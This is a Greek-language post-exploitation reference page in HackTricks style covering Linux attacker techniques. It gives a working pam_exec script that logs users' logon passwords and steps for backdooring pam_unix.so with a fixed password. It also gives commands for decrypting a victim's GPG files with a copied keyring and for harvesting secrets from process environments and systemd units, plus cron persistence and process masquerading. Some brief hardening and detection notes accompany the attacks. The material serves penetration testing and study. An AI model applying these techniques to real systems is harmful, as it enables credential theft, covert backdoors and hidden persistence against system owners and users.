# Linux Post-Exploitation

{{#include ../../banners/hacktricks-training.md}}

## Sniffing Logon Passwords with PAM

Ας διαμορφώσουμε ένα PAM module για να καταγράφει κάθε κωδικό που χρησιμοποιεί κάθε χρήστης για να συνδεθεί. Αν δεν ξέρεις τι είναι το PAM, δες:

{{#ref}}
pam-pluggable-authentication-modules.md
{{#endref}}

**Για περισσότερες λεπτομέρειες δείτε το [αρχικό άρθρο](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**. Αυτό είναι απλώς μια περίληψη:

**Επισκόπηση τεχνικής:**
Τα Pluggable Authentication Modules (PAM) προσφέρουν ευελιξία στη διαχείριση της επαλήθευσης ταυτότητας σε συστήματα βασισμένα σε Unix. Μπορούν να ενισχύσουν την ασφάλεια προσαρμόζοντας τις διαδικασίες σύνδεσης αλλά επίσης δημιουργούν κινδύνους εάν χρησιμοποιηθούν κακόβουλα. Αυτή η περίληψη περιγράφει μια τεχνική για την καταγραφή των διαπιστευτηρίων σύνδεσης χρησιμοποιώντας το PAM, μαζί με στρατηγικές μετριασμού.

**Καταγραφή διαπιστευτηρίων:**

- Ένα bash script με όνομα `toomanysecrets.sh` δημιουργείται για να καταγράφει τις προσπάθειες σύνδεσης, αποθηκεύοντας την ημερομηνία, το όνομα χρήστη (`$PAM_USER`), τον κωδικό (μέσω stdin), και την IP του απομακρυσμένου host (`$PAM_RHOST`) στο `/var/log/toomanysecrets.log`.
- Το script γίνεται εκτελέσιμο και ενσωματώνεται στη διαμόρφωση του PAM (`common-auth`) χρησιμοποιώντας το `pam_exec.so` module με επιλογές για ήσυχη εκτέλεση και για να εκθέσει το authentication token στο script.
- Η προσέγγιση δείχνει πώς ένας παραβιασμένος Linux host μπορεί να εκμεταλλευτεί για να καταγράφει διακριτικά τα διαπιστευτήρια.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Backdooring PAM

**Για περισσότερες λεπτομέρειες ελέγξτε το [original post](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**. Αυτό είναι απλώς μια σύντομη περίληψη:

Το Pluggable Authentication Module (PAM) είναι ένα σύστημα που χρησιμοποιείται στο Linux για την πιστοποίηση χρηστών. Λειτουργεί με τρεις βασικές έννοιες: **username**, **password**, και **service**. Τα αρχεία ρύθμισης για κάθε service βρίσκονται στον κατάλογο `/etc/pam.d/`, όπου shared libraries χειρίζονται την authentication.

**Στόχος**: Τροποποίηση του PAM ώστε να επιτρέπει authentication με έναν συγκεκριμένο password, παρακάμπτοντας τον πραγματικό κωδικό χρήστη. Αυτό επικεντρώνεται ειδικά στη shared library `pam_unix.so` που χρησιμοποιεί το αρχείο `common-auth`, το οποίο περιλαμβάνεται σε σχεδόν όλες τις services για την επαλήθευση του password.

### Steps for Modifying `pam_unix.so`:

1. **Εντοπίστε την οδηγία Authentication** στο αρχείο `common-auth`:
- Η γραμμή που είναι υπεύθυνη για τον έλεγχο του password του χρήστη καλεί το `pam_unix.so`.
2. **Τροποποίηση του πηγαίου κώδικα**:
- Προσθέστε μια συνθήκη στο αρχείο πηγαίου κώδικα `pam_unix_auth.c` που χορηγεί πρόσβαση αν χρησιμοποιηθεί ένας προκαθορισμένος password, αλλιώς συνεχίζει με τη συνήθη διαδικασία authentication.
3. **Επαναμεταγλωττίστε και αντικαταστήστε** τη τροποποιημένη βιβλιοθήκη `pam_unix.so` στον κατάλληλο κατάλογο.
4. **Δοκιμές**:
- Η πρόσβαση χορηγείται σε διάφορες υπηρεσίες (login, ssh, sudo, su, screensaver) με τον προκαθορισμένο password, ενώ οι κανονικές διαδικασίες authentication παραμένουν ανεπηρέαστες.

> [!TIP]
> Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία με [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)

## Αποκρυπτογράφηση GPG loot μέσω μετακίνησης του homedir

Αν βρείτε ένα κρυπτογραφημένο `.gpg` αρχείο και τον φάκελο ενός χρήστη `~/.gnupg` (pubring, private-keys, trustdb) αλλά δεν μπορείτε να το αποκρυπτογραφήσετε λόγω δικαιωμάτων/κλειδωμάτων στο GnuPG homedir, αντιγράψτε το keyring σε μια εγγράψιμη τοποθεσία και χρησιμοποιήστε το ως GPG home.

Τυπικά σφάλματα που θα δείτε χωρίς αυτό: "unsafe ownership on homedir", "failed to create temporary file", ή "decryption failed: No secret key" (επειδή το GPG δεν μπορεί να διαβάσει/γράψει το αρχικό homedir).

Workflow:
```bash
# 1) Stage a writable homedir and copy the victim's keyring
mkdir -p /dev/shm/fakehome/.gnupg
cp -r /home/victim/.gnupg/* /dev/shm/fakehome/.gnupg/
# 2) Ensure ownership & perms are sane for gnupg
chown -R $(id -u):$(id -g) /dev/shm/fakehome/.gnupg
chmod 700 /dev/shm/fakehome/.gnupg
# 3) Decrypt using the relocated homedir (either flag works)
GNUPGHOME=/dev/shm/fakehome/.gnupg gpg -d /home/victim/backup/secrets.gpg
# or
gpg --homedir /dev/shm/fakehome/.gnupg -d /home/victim/backup/secrets.gpg
```
Αν το υλικό του μυστικού κλειδιού υπάρχει στο `private-keys-v1.d`, το GPG θα το ξεκλειδώσει και θα αποκρυπτογραφήσει χωρίς να ζητήσει passphrase (ή θα ζητήσει αν το κλειδί είναι προστατευμένο).


## Συλλογή διαπιστευτηρίων από το environment της διεργασίας (συμπεριλαμβανομένων των containers)

Όταν αποκτάς εκτέλεση κώδικα μέσα σε μία υπηρεσία, η διεργασία συχνά κληρονομεί ευαίσθητες μεταβλητές περιβάλλοντος. Αυτές είναι χρυσωρυχείο για lateral movement.

Γρήγορα αποτελέσματα
- Εξάγαγε το env της τρέχουσας διεργασίας: `env` ή `printenv`
- Εξάγαγε το env άλλης διεργασίας: `tr '\0' '\n' </proc/<PID>/environ | sed -n '1,200p'`
- Πρόσθεσε `strings -z /proc/<PID>/environ` αν τα `tr`/`sed` δεν είναι διαθέσιμα
- Στα containers, έλεγξε επίσης PID 1: `tr '\0' '\n' </proc/1/environ`

Τι να ψάξεις
- Μυστικά εφαρμογών και διαπιστευτήρια admin (π.χ., Grafana ορίζει `GF_SECURITY_ADMIN_USER`, `GF_SECURITY_ADMIN_PASSWORD`)
- API keys, DB URIs, SMTP διαπιστευτήρια, OAuth secrets
- Proxy και TLS overrides: `http_proxy`, `https_proxy`, `SSL_CERT_FILE`, `SSL_CERT_DIR`

Σημειώσεις
- Πολλές πλατφόρμες orchestration περνάνε ευαίσθητες ρυθμίσεις μέσω του env· αυτές κληρονομούνται από τα child processes και εκτίθενται σε οποιοδήποτε shell που ξεκινήσεις μέσα στο context της διεργασίας.
- Σε ορισμένες περιπτώσεις, αυτά τα διαπιστευτήρια επαναχρησιμοποιούνται σε όλο το σύστημα (π.χ., ίδιο username/password έγκυρο για SSH στο host), επιτρέποντας εύκολο pivot.

## Systemd-stored credentials in unit files (Environment=)

Οι υπηρεσίες που ξεκινούν από systemd μπορεί να ενσωματώνουν διαπιστευτήρια στα unit files ως `Environment=` εγγραφές. Εντοπίστε και εξαγάγετέ τα:
```bash
# Unit files and drop-ins
ls -la /etc/systemd/system /lib/systemd/system
# Grep common patterns
sudo grep -R "^Environment=.*" /etc/systemd/system /lib/systemd/system 2>/dev/null | sed 's/\x00/\n/g'
# Example of a root-run web panel
# [Service]
# Environment="BASIC_AUTH_USER=root"
# Environment="BASIC_AUTH_PWD=<password>"
# ExecStart=/usr/bin/crontab-ui
# User=root
```
Τα λειτουργικά artifacts συχνά leak κωδικούς (π.χ., backup scripts που καλούν `zip -P <pwd>`). Αυτές οι τιμές συχνά επαναχρησιμοποιούνται σε internal web UIs (Basic-Auth) ή άλλες υπηρεσίες.

Σκληροποίηση
- Μετακινήστε τα secrets σε αφιερωμένα secret stores (`systemd-ask-password`, `EnvironmentFile` με κλειδωμένα perms, ή εξωτερικούς secret managers)
- Αποφύγετε την ενσωμάτωση διαπιστευτηρίων σε unit files· προτιμήστε drop-in αρχεία που διαβάζονται μόνο από root και αφαιρέστε τα από το version control
- Ανανεώστε τα leaked passwords που εντοπίστηκαν κατά τις δοκιμές

## Επιμονή με Cron και loopback mutex

- Αντιγράψτε implants σε πολλαπλά εγγράψιμα μονοπάτια (`/tmp`, `/var/tmp`, `/dev/shm`, `/run/lock`) και εγκαταστήστε cron entries όπως `*/5 * * * * /tmp/<bin>` ώστε να respawn ακόμα κι αν διαγραφούν αλλού.
- Εξασφαλίστε **single-instance** εκτέλεση δεσμεύοντας μια σταθερή loopback θύρα (π.χ., `127.0.0.1:51125` ή `127.0.0.1:52225`) και τερματίζοντας αν το `bind()` αποτύχει· `ss -lntp | grep -E '51125|52225'` θα αποκαλύψει τον mutex listener.
- Οι operators μπορεί περιοδικά να mass-kill οποιαδήποτε process του οποίου το `cmdline` περιέχει το όνομα του dropper (π.χ., `init_stop`), οπότε η επαναχρησιμοποίηση αυτών των ονομάτων κατά την ανάλυση μπορεί να συγκρουστεί· επιλέξτε μοναδικά filenames.

## Μάσκάρισμα διεργασίας μέσω prctl + argv overwrite

- Ορίστε το σύντομο όνομα διεργασίας με `prctl(PR_SET_NAME, "<label>")` (όριο 15-byte για το `comm`), συνήθως σε `init`, ώστε το `/proc/<pid>/status` και τα GUIs να εμφανίζουν μια αβλαβή ετικέτα.
- Overwrite του in-memory buffer `argv[0]` μετά την ανάγνωση του μήκους του `/proc/self/cmdline` και του δείκτη `argv[0]`, συμπληρώνοντας με NULs ώστε το `/proc/<pid>/cmdline` και το `ps` να εμφανίζουν επίσης την ψεύτικη ετικέτα.
- Εντοπισμός συγκρίνοντας το `Name:` στο `/proc/<pid>/status` με το πραγματικό executable path και αναζητώντας loopback mutex listeners που ανήκουν σε processes με πολύ μικρά/κενά cmdlines.

## References

- [0xdf – HTB Planning (Grafana env creds reuse, systemd BASIC_AUTH)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [0xdf – HTB Environment (GPG homedir relocation to decrypt loot)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [GnuPG Manual – Home directory and GNUPGHOME](https://www.gnupg.org/documentation/manuals/gnupg/GPG-Configuration-Options.html#index-homedir)
- [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)

{{#include ../../banners/hacktricks-training.md}}
